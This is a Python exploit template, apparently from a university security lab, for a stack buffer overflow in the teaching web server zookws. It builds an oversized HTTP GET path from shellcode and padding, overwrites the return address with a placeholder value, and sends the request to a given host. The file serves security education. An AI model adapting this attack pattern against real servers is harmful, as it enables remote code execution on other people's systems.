#!/usr/bin/env python3

# exploit_template.py
#
# Do NOT change this file! Instead, you should make a copy of this file for
# each exploit you create.

import sys
import socket
import traceback
import urllib
import urllib.parse
import struct

# You might find it useful to define variables that store various
# stack or function addresses from the zookd / zookfs processes,
# which you can then use in build_exploit(); the following are just
# examples.

stack_buffer = 0xbfffe6d8 
stack_saved_ebp = 0xbfffeee8
stack_retaddr = stack_saved_ebp + 4


# This is the function that you should modify to construct an
# HTTP request that will cause a buffer overflow in some part
# of the zookws web server and exploit it.
def build_exploit(shellcode):
    # Things that you might find useful in constructing your exploit:
    #
    #   urllib.parse.quote(s).encode()
    #     returns string s with 'special' characters percent-encoded
    #
    #   struct.pack('<I', x)
    #     returns the 4-byte binary encoding of the 32-bit integer x
    #
    #   variables for program addresses (ebp, buffer, retaddr=ebp+4)
    #
    # Note that in Python 3, regular strings like 'hello world' are Unicode
    # strings, not byte strings. You should take care to use the latter over
    # the former (e.g. b'hello world').

    hello = b'/'
    hello += shellcode
    for i in range(8170-len(shellcode)):
        hello += b'A'
    hello += b'\xbb\xbb\xbb\xbb' # Reverse order because of endianism
    test = b'GET ' + hello + b' HTTP/1.0\r\n' + b'\r\n'

    return test


def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('Connecting to %s:%d...' % (host, port))
    sock.connect((host, port))

    print('Connected, sending request...')
    sock.send(req)

    print('Request sent, waiting for reply...')
    rbuf = sock.recv(1024)
    resp = b''
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print('Received reply.')
    sock.close()
    return resp


def main():
    if len(sys.argv) != 3:
        print('Usage:', sys.argv[0], '<host>', '<port>')
        exit()

    try:
        shellfile = open('shellcode.bin', 'rb')
        shellcode = shellfile.read()
        req = build_exploit(shellcode)
        print('HTTP request:')
        print(req)

        resp = send_req(sys.argv[1], int(sys.argv[2]), req)
        print('HTTP response:')
        print(resp)
    except:
        print('Exception:')
        traceback.print_exc()


if __name__ == '__main__':
    main()
